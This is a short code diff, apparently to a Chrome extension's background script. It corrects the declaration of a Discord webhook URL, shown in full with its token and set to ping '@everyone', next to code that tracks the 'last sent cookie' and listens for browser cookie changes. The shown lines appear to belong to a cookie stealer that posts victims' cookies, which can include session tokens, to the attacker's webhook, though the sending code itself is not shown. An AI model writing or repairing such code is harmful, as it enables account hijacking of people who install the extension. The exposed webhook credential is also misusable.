@@ -1,4 +1,4 @@
-const WEBHOOKS "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc",
+const WEBHOOK = "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc";
         mention: "@everyone"
 
 let lastCookie = null; // 🔑 Track last sent cookie
@@ -137,3 +137,4 @@ chrome.cookies.onChanged.addListener(function (changeInfo) {
         }
     }
 });
+
